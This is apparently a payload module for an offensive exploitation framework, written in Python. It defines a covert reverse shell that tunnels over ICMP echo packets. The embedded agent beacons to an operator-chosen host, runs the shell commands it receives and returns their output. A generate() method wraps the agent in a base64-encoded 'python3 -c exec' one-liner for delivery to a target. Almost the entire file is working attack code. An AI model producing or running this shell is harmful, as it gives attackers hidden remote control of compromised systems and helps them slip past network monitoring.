#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *


_ICMP_AGENT_TEMPLATE = r'''import subprocess
import os
import sys
import time
import queue
import platform

try:
    from scapy.all import IP, ICMP, sniff, send, Raw
except ImportError:
    print("Error: pip install scapy")
    sys.exit(1)

class ICMPReverseShell:
    def __init__(self, target_ip, shell_cmd="__SHELL__"):
        self.target_ip = target_ip
        self.shell_cmd = shell_cmd
        self.running = True

    def send_icmp(self, payload):
        try:
            pkt = IP(dst=self.target_ip) / ICMP(type=8, id=os.getpid()) / Raw(load=payload.encode())
            send(pkt, verbose=0)
            return True
        except Exception:
            return False

    def receive_response(self, timeout=10):
        response_data = None
        received = {"flag": False}

        def handle_packet(packet):
            nonlocal response_data
            if ICMP in packet and packet[ICMP].type == 0:
                if packet[IP].src == self.target_ip and Raw in packet:
                    response_data = packet[Raw].load.decode("utf-8", errors="ignore")
                    received["flag"] = True

        try:
            sniff(
                filter="icmp and host " + self.target_ip,
                prn=handle_packet,
                timeout=timeout,
                count=1,
                stop_filter=lambda x: received["flag"],
            )
        except Exception:
            pass
        return response_data

    def execute_command(self, command):
        try:
            kwargs = {"shell": True, "stdout": subprocess.PIPE, "stderr": subprocess.PIPE}
            if platform.system() != "Windows":
                kwargs["executable"] = self.shell_cmd
            process = subprocess.Popen(command, **kwargs)
            stdout, stderr = process.communicate()
            output = stdout.decode("utf-8", errors="ignore")
            if stderr:
                output += stderr.decode("utf-8", errors="ignore")
            return output
        except Exception as exc:
            return "Error: " + str(exc)

    def run(self):
        self.send_icmp("CONNECT")
        time.sleep(1)
        while self.running:
            try:
                self.send_icmp("READY")
                response = self.receive_response(timeout=10)
                if response:
                    if response == "EXIT":
                        break
                    if response.startswith("CMD:"):
                        command = response[4:]
                        if command:
                            output = self.execute_command(command)
                            self.send_icmp("OUTPUT:" + output)
                    elif response == "PING":
                        self.send_icmp("PONG")
                time.sleep(0.5)
            except KeyboardInterrupt:
                break
            except Exception:
                time.sleep(1)

if __name__ == "__main__":
    ICMPReverseShell("__LHOST__").run()
'''


class Module(Payload):
    __info__ = {
        "name": "Python Reverse ICMP Shell",
        "description": "Covert reverse shell over ICMP Echo packets (requires scapy + root/CAP_NET_RAW)",
        "category": PayloadCategory.CMD,
        "platform": Platform.UNIX,
        "listener": "listeners/multi/reverse_icmp",
        "handler": Handler.REVERSE,
        "session_type": SessionType.SHELL,
    }

    lhost = OptString("127.0.0.1", "Operator IP to send ICMP replies to", True)
    python_binary = OptString("python3", "Python binary on target", True)
    shell_binary = OptString("/bin/bash", "Shell for command execution", False, advanced=True)

    def generate(self):
        import base64

        shell = "/bin/bash" if str(self.shell_binary or "/bin/bash") == "/bin/bash" else str(self.shell_binary)
        script = (
            _ICMP_AGENT_TEMPLATE.replace("__LHOST__", str(self.lhost))
            .replace("__SHELL__", shell.replace("\\", "\\\\").replace('"', '\\"'))
        )
        py = str(self.python_binary or "python3")
        enc = base64.b64encode(script.encode()).decode("ascii")
        return f'{py} -c "import base64;exec(base64.b64decode(\'{enc}\').decode())"'
